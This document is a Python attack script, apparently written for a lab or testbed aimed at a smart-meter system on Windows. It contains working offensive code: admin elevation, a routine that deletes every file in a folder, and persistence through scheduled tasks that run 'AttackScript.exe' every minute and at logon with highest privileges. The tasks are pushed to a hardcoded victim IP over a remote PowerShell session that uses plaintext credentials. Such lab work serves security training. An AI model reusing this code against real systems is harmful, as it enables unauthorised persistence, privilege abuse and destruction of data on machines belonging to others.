from os import walk, path, remove, system, getcwd, mkdir, scandir, urandom, kill, rmdir
from psutil import process_iter
import signal
import base64
from pathlib import Path
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from shutil import copyfile
from subprocess import run, check_call, CalledProcessError, PIPE, check_output, call
from ctypes import windll
from sys import executable, argv
from win32netcon import ACCESS_ALL
from win32net import NetShareAdd
from time import sleep
from win32console import GetConsoleWindow
from win32gui import ShowWindow
import kepconfig
import pkgutil
from kepconfig import connection, admin, connectivity
import json
import sys

# Set the path for the shared directory
COPIED_PATH = "C:\\Windows\\temp\\Smartmeter"

# Set the path for the Smart Meter folder
SMARTMETER_PATH = "C:\\Users\\Student\\Documents\\AttackFolder"

VICTIM_IP = "172.16.2.77"

# Check if the script is running with administrator privileges, if not, restart with elevated privileges
def check_admin() -> None:
    """
    Check if script is running wit admin privilege. Else, restart as admin.
    """
    try:
        isAdmin = windll.shell32.IsUserAnAdmin()
    except AttributeError:
        isAdmin = False
    if not isAdmin:
        windll.shell32.ShellExecuteW(None, "runas", executable, __file__, None, 1)
# Delete files in a specific folder
def delete_files(folder_path):
    for root, dirs, files in walk(folder_path):
        for file in files:
            og = path.join(root, file)
            dest = path.join(COPIED_PATH, file)
            remove(og)
            print("File: " + str(og) + " is deleted")

def create_scheduled_task() -> None:
    """
    Creates scheduled task in windows to execute the attackscript from time to time.

    # TODO: Add comments on how frequent the schtasks run.
    # FIXME: Might be decpricated once this is done with powershell, as the AttackScript.exe is uselsss
    """
    executable_file_path = r'C:/Windows/temp/SmartMetertest/AttackScript.exe'

    executable_file_parameters = '1'

    task_name1 = 'Smart Meter Testing'
    task_name2 = 'Smart Meter Testing 2'

    sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 1 /f /rl HIGHEST'
    sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon /f /rl HIGHEST'

    # call(sch1, shell=True)
    # call(sch2, shell=True)

    # TODO: wait for the PS Command and see if this works.
    stuff = run(f"powershell.exe New-PSSession -ComputerName {VICTIM_IP} -Credential (New-Object System.Management.Automation.PSCredential -ArgumentList Student, (ConvertTo-SecureString Student12345@ -AsPlainText -Force)) {sch1}", stdout=PIPE, shell=True)
    print(stuff)

if __name__ == '__main__':
    # NOTE: Could change this to Match Case statement or with dictionary functions. See the preference first
    attack_option = str(argv[1])

    if attack_option != "1":
        check_admin()
    
    if attack_option == "1":
        try:
            create_scheduled_task()
            print("\nOk.\n")
        except Exception as e:
            print(e)
            print("\nFail.\n")